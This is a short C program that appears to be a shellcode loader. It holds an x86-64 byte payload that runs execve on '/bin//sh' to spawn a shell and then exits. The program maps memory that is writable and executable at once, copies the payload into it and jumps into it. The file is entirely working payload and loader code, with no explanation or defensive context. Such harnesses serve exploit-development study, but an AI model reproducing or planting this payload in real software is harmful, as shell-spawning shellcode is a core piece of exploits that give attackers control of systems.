#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = 
    "\x48\x31\xc0\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48"
    "\x31\xc0\x48\x89\xe7\x50\x57\xb0\x3b\x48\x89\xe6\x48\x31\xd2\x0f"
    "\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05";

int main() {
    printf("[+] Requesting executable memory page...\n");

    void *exec_mem = mmap(NULL, sizeof(shellcode), 
                          PROT_READ | PROT_WRITE | PROT_EXEC, 
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap allocation failed");
        return 1;
    }

    memcpy(exec_mem, shellcode, sizeof(shellcode));

    printf("[+] Jumping directly into shellcode payload!\n");

    int (*run_payload)() = (int(*)())exec_mem;
    run_payload();

    return 0;
}